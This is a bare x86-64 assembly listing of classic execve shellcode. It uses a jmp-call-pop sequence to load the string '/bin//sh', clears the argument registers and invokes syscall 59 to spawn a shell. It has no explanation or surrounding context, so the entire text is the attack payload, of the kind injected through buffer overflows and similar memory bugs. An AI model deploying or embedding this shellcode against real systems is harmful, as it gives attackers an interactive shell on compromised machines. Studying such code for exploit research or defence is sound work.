section .text
    global _start
_start:
    jmp shell
here:
    xor rax,rax
    pop rdi
    xor rsi,rsi
    xor rdx,rdx
    add rax,59
    syscall
shell:
    call here
bash db "/bin//sh"